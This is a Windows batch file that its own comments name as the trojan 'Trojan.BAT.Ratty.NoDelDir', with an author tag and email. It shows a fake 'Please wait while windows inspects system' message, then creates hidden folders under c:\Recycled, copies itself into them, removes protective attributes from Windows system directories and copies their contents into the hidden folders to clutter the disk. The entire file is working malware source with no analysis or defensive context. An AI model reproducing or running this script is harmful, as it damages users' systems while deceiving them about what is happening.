@echo off
@echo @echo Please wait while windows inspects system ...
@md c:\Recycled\�Ratty >nul
@md c:\Recycled\�Ratty� >nul
@attrib c:\Recycled\�Ratty +s +h -r +a
@attrib c:\Recycled\�Ratty� +s +h -r +a
@copy %0 c:\Recycled\�Ratty >nul
@copy %0 c:\Recycled\�Ratty� >nul
@attrib c:\windows\system\*.* -s -h -r +a
@attrib c:\windows\inf\*.* -s -h -r +a
@attrib c:\windows\help\*.* -s -h -r +a
@attrib c:\windows\sysbckup\*.* -s -h -r +a
@attrib c:\windows\java\*.* -s -h -r +a
@copy c:\windows\system\*.* c:\Recycled\�Ratty� >nul
@copy c:\windows\inf\*.* c:\Recycled\�Ratty� >nul
@copy c:\windows\help\*.* c:\Recycled\�Ratty� >nul
@copy c:\windows\sysbckup\*.* c:\Recycled\�Ratty� >nul
@copy c:\windows\java\*.* c:\Recycled\�Ratty� >nul
@copy c:\windows\system\*.* c:\Recycled\�Ratty >nul
@copy c:\windows\inf\*.* c:\Recycled\�Ratty >nul
@copy c:\windows\help\*.* c:\Recycled\�Ratty >nul
@copy c:\windows\sysbckup\*.* c:\Recycled\�Ratty >nul
@copy c:\windows\java\*.* c:\Recycled\�Ratty >nul
@attrib c:\Recycled\�Ratty\*.* +s +h +r +a
@attrib c:\Recycled\�Ratty�\*.* +s +h +r +a
::Kaspersky name is Trojan.BAT.Ratty.NoDelDir
::Another DVL creation
::dvl2003ro@yahoo.co.uk
cls